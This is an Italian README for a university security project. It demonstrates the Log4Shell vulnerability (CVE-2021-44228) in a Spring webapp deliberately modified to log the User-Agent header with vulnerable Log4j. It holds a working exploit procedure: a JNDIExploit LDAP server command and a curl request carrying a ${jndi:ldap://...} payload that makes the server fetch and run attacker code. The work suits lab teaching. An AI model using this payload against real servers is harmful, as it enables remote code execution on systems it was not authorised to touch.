# Progetto sicurezza Informatica ICDA A.A 2021-2022

Lo scopo di questo progetto è quello di mostrare la vulnerabilità Log4shell CVE-2021-44228 che affligge la libreria Java Log4j , impiegata da innumerevoli software di ogni tipo (programmi standard, giochi, webapp).

In questo progetto è stata scelta una webapp realizzata con il popolare web framework Java MVC, opportunamente modificata per lo scopo.

La parte da me modificata si trova nel controller "HomeController", file "src\main\java\com\nico\store\store\controller\HomeController.java".
Nel controller è stata istanziata la classe Logger, ed è stata aggiunta (mediante annotazione) l'istruzione per ricavare l'header della richiesta "User-Agent" e passarla al controller. All'interno del controller, si è usata l'istanza del Logger per loggare la User-Agent. Ne consegue quindi, che se un client invia una  richiesta, sfruttando la Java API JNDI (Java Naming and Directory Interface) al server LDAP con l'header opportunamente modificato (nel nostro caso la user-agent, ma avrei potuto sceglierne un altro volendo), contenente l'istruzione per il download di una classe Java dal server LDAP, verrà eseguito il codice contenuto nella classe.

La libreria impiegata di log4J 2.6.1.
Nel progetto è presente il file pom.xml per la compilazione tramite Maven.
Ho creato un DockerFile che contiene al suo interno tutto il necessario per avviare l'immagine senza alcuna configurazione e senza installare la JDK necessaria per dimostrare l'exploit.

## Utilizzo
Prima di tutto sarà necessario avviare un server mysql e impostare il relativo indirizzo, username e password nel file "application.properties", all'interno della cartella "resources". è possibile utilizzare un container docker allo scopo.

Successivamente sarà necessario avviare il server LDAP che servirà la classe Java con il Payload.


```bash
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i tuo-indirizzo-ip-privato -p 8888
```



Per sfruttare la vulnerabilità è necessario  creare un payload (un comando che si vuole far eseguire al server remoto). Esempio:

```bash
touch /tmp/hacked
```

e includerlo (codificato in base64) in una richiesta da inviare al server della webApp. Si userà il comando Curl per lo scopo.

Una volta inviato il comando, il metodo della libreria Log4j invocato nel controller, interpreterà il comando, sarà scaricata ed eseguita  una classe Java dal server LDAP (controllato dall'attaccante)  e successivamente avverrà l'esecuzuzione del payload, contenuto all'interno della classe Java scaricata nel passo precedente. Esempio di comando valido:

```bash
curl -A '${jndi:ldap://192.168.10.128:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9oYWNrZWQ=}' http://172.18.0.2:8080
```
Per codificare in base64 il payload ci si può servire del tool disponibile qui: https://gchq.github.io/CyberChef/

Ovviamente il server della WebApp deve essere avviato prima di inviare la richiesta curl.

## Avvio web-app

Se si desidera utilizzare il container docker (consigliato), si deve prima di tutto clonare questo repo con:
```bash
git clone https://github.com/andree93/sicurezza-spring-webapp-log4j.git
```

Posizionarsi nella directory principale della webApp e creare l'immagine docker con il Dockerfile presente su questo repo:
```bash
docker build --tag nomeContainer .
```

Crea il volume docker con il file di configurazione:
```bash
docker volume create nomeVolume
```

e dopo andare nella directory dei dati del volume appena creato e copiare il file di configurazione  "application.properties"  che si trova nella directory "config" (potrebbero essere necessari i privilegi di root):
```bash
cp application.properties /var/lib/docker/volumes/nomeVolume/_data
```

Avviare il container:

```bash
docker run --name nomeContainer -p 8080:8080 --network nomeRete -v nomeVolumeDocker:/config nomeImmagineDocker
```

Oppure è possibile montare direttamente la cartella che contiene il file di configurazione, senza creare il volume docker:

```bash
docker run -it --name nomeContainer -p 8080:8080 --network nomeSottoRete -v /percorso/al/file/config/:/config nomeImmagineDocker
```






Dopo aver inviato la request al server della webApp, come descritto sopra (ad esempio con curl), sarà possibile notare dai log del server LDAP che è stata "servita" la classe Java al server della nostra WebApp, con il payload al suo interno.
A seconda del comando eseguito, è possibile vedere il risultato. Ad esempio, se il payload provoca la creazione di file, è possibile entrare nel container e verificarlo. Ad esempio:


```bash
docker exec -it nomeApplicazione sh
```

```bash
ls /tmp/hacked
```

Ovviamente è possibile sfruttare la vulnerabilità eseguendo la webApp senza docker, ma è necessario che la JDK (o JRE) abbia abilitata l'opzione che consente di eseguire classi scaricate da un server remoto JNDI.
L'immagine docker, ad esempio, è stata creata a partire dalla JDK-8u181, che ha l'opzione abilitata di default.

```bash
com.sun.jndi.ldap.object.trustURLCodebase=true
```

Tuttavia, avere una versione più recente della JDK/JRE non è sufficiente per mettersi completamente al riparo dalla vulnerabilità.


```

## Contributing
La webApp impiegata in questo progetto è stata creata dall'autore GNico (github: https://github.com/GNico/spring-eshop )


Il server JNDI/LDAP è stato creato da feihong-cs.


La libreria Log4J è di Apache Software foundation https://logging.apache.org/log4j/2.x/index.html

Integrazione libreria Log4J nella webApp e containerizzazione: Andrea Carro



## License
[MIT](https://choosealicense.com/licenses/mit/)
